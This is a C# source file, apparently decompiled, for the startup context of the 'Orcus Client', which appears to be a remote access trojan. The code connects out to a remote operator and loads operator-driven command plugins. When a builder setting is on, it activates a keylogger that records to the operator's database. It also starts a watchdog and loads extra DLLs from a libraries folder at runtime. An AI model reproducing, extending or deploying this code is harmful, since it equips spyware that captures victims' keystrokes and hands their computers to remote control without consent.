using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Connection;
using Orcus.Core;
using Orcus.Plugins;
using Orcus.Properties;
using Orcus.Protection;
using Orcus.Shared.Commands.ExceptionHandling;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Settings;
using Orcus.StaticCommandManagement;
using Orcus.Utilities;
using Orcus.Utilities.KeyLogger;

namespace Orcus;

public class OrcusApplicationContext : ApplicationContext
{
	private readonly Client _client;

	private readonly object _unloadLock = new object();

	private bool _unloaded;

	public KeyLoggerService KeyLoggerService { get; }

	public AsyncOperation AsyncOperation { get; private set; }

	public OrcusApplicationContext()
	{
		Application.add_Idle((EventHandler)ApplicationOnIdle);
		_client = new Client();
		_client.Connected += ClientOnConnected;
		StaticCommandSelector.Initialize((IClientInfo)(object)_client);
		foreach (IFactoryClientCommand factoryCommandPlugin in PluginLoader.Current.FactoryCommandPlugins)
		{
			factoryCommandPlugin.get_Factory().Initialize((IClientOperator)(object)ClientOperator.Instance);
		}
		_client.BeginConnect();
		Application.add_ApplicationExit((EventHandler)Application_ApplicationExit);
		ErrorReporter.Current.ExceptionsAvailable += Current_ExceptionsAvailable;
		if (Orcus.Config.Settings.GetBuilderProperty<KeyloggerBuilderProperty>().get_IsEnabled())
		{
			KeyLoggerService = new KeyLoggerService((IDatabaseConnection)(object)ClientOperator.Instance.DatabaseConnection);
			try
			{
				KeyLoggerService.Activate();
			}
			catch (Exception exception)
			{
				ErrorReporter.Current.ReportError(exception, "Activating keylogger");
			}
		}
		foreach (ILoadable loadable in PluginLoader.Current.Loadables)
		{
			try
			{
				loadable.Start();
			}
			catch (Exception exception2)
			{
				ErrorReporter.Current.ReportError(exception2, string.Concat("Load plugin: \"", ((object)loadable).GetType(), "\""));
			}
		}
		if (File.Exists(Path.GetTempPath() + "\\e3c6cefd462d48f0b30a5ebcd238b5b1"))
		{
			File.WriteAllText(Path.GetTempPath() + "\\e3c6cefd462d48f0b30a5ebcd238b5b1", SettingsData.SIGNATURE);
		}
		AppDomain.CurrentDomain.AssemblyResolve += CurrentDomainOnAssemblyResolve;
		ShowWindow();
	}

	private Assembly CurrentDomainOnAssemblyResolve(object sender, ResolveEventArgs args)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Consts.LibrariesDirectory);
		if (!directoryInfo.Exists)
		{
			return null;
		}
		string text = Path.Combine(directoryInfo.FullName, new AssemblyName(args.Name).Name + ".dll");
		if (File.Exists(text))
		{
			return Assembly.LoadFrom(text);
		}
		return null;
	}

	private void ShowWindow()
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(Resources.ConnectEnvironment);
		val.set_Text("Orcus Client");
		val.set_Visible(true);
		Form window = null;
		val.add_DoubleClick((EventHandler)delegate
		{
			if (window == null)
			{
				window = (Form)(object)new MainForm(_client);
				((Control)window).Show();
				window.add_Closing((CancelEventHandler)delegate
				{
					window = null;
				});
			}
			else
			{
				window.Activate();
			}
		});
	}

	private void ClientOnConnected(object sender, EventArgs e)
	{
		if (ErrorReporter.Current.IsDataAvailable)
		{
			Current_ExceptionsAvailable(null, null);
		}
	}

	private void Current_ExceptionsAvailable(object sender, EventArgs e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		if (_client.IsConnected)
		{
			try
			{
				Serializer val = new Serializer(typeof(List<ExceptionInfo>));
				_client.Connection.PushExceptions(val.Serialize((object)ErrorReporter.Current.GetData()));
				ErrorReporter.Current.ExceptionSent();
			}
			catch (Exception)
			{
			}
		}
	}

	public void Unload()
	{
		if (_unloaded)
		{
			return;
		}
		lock (_unloadLock)
		{
			if (_unloaded)
			{
				return;
			}
			_unloaded = true;
			_client.Dispose();
			Program.Mutex.Close();
			foreach (ILoadable loadable in PluginLoader.Current.Loadables)
			{
				try
				{
					loadable.Shutdown();
				}
				catch (Exception exception)
				{
					ErrorReporter.Current.ReportError(exception, string.Concat("Shutdown plugin\"", ((object)loadable).GetType(), "\""));
				}
			}
			KeyLoggerService?.Dispose();
		}
	}

	private void Application_ApplicationExit(object sender, EventArgs e)
	{
		Unload();
	}

	private void ApplicationOnIdle(object sender, EventArgs e)
	{
		Application.remove_Idle((EventHandler)ApplicationOnIdle);
		AsyncOperation = AsyncOperationManager.CreateOperation(null);
		if (Orcus.Config.Settings.GetBuilderProperty<WatchdogBuilderProperty>().get_IsEnabled())
		{
			Watchdog.Initizalize();
		}
	}
}
